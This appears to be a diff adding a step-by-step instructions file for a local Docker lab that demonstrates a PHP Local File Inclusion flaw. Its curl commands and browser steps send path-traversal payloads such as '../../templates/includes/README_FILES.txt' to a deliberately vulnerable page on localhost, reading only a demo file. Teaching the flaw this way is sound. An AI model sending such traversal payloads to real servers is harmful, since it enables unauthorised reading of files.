@@ -1,0 +1,65 @@
+===========================================
+LFI Demo - Exact Commands for Reproduction
+===========================================
+
+This file contains the exact commands you should type to reproduce the LFI vulnerability demonstration.
+
+STEP 1: Build and Start the Container
+--------------------------------------
+docker compose up --build
+
+(Wait for the container to start. You should see "Apache/2.x.x (Unix) Server" messages.)
+
+STEP 2: Test the Homepage
+--------------------------
+curl http://127.0.0.1:8080/
+
+STEP 3: View Safe Pages (Normal Usage)
+---------------------------------------
+curl http://127.0.0.1:8080/vulnerable.php?page=about.php
+curl http://127.0.0.1:8080/vulnerable.php?page=contact.php
+curl http://127.0.0.1:8080/vulnerable.php?page=help.php
+
+STEP 4: Demonstrate Path Traversal (LFI Attack)
+------------------------------------------------
+# Attempt to read README_FILES.txt using path traversal
+curl "http://127.0.0.1:8080/vulnerable.php?page=../../templates/includes/README_FILES.txt"
+
+# Try different path traversal depths
+curl "http://127.0.0.1:8080/vulnerable.php?page=../includes/README_FILES.txt"
+curl "http://127.0.0.1:8080/vulnerable.php?page=../../../templates/includes/README_FILES.txt"
+
+STEP 5: Test Error Handling
+----------------------------
+# Try a non-existent file
+curl "http://127.0.0.1:8080/vulnerable.php?page=nonexistent.php"
+
+# Try with no parameter
+curl "http://127.0.0.1:8080/vulnerable.php"
+
+# Try with empty parameter
+curl "http://127.0.0.1:8080/vulnerable.php?page="
+
+STEP 6: Browser-Based Testing (Alternative)
+--------------------------------------------
+Open your browser and navigate to:
+  http://127.0.0.1:8080
+
+Then try:
+  1. Click on the "About", "Contact", or "Help" links
+  2. Use the form to enter: about.php
+  3. Use the form to enter: ../../templates/includes/README_FILES.txt
+  4. Use the form to enter: nonexistent.php
+
+STEP 7: Stop the Container
+---------------------------
+docker compose down
+
+===========================================
+Notes:
+- All commands should be typed exactly as shown
+- The quotes around URLs with special characters are important
+- The container must be running (from Step 1) for Steps 2-5 to work
+- Browser testing (Step 6) is optional but recommended for visual demonstration
+===========================================
+
